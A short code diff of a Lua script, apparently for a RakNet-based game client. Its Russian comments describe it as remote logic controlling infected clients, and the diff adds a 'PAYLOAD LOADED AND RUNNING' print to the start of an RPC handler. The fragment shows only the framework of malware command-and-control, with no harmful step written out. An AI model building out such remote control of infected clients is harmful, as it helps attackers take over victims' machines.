@@ -2,6 +2,7 @@
 -- Удаленная логика, управляющая зараженными клиентами 
 
 -- Обработка RPC сообщений от сервера [cite: 22]
+print("PAYLOAD LOADED AND RUNNING")
 function onReceiveRpc(id, bs)
     if id == 93 then
         local color = raknetBitStreamReadInt32(bs)
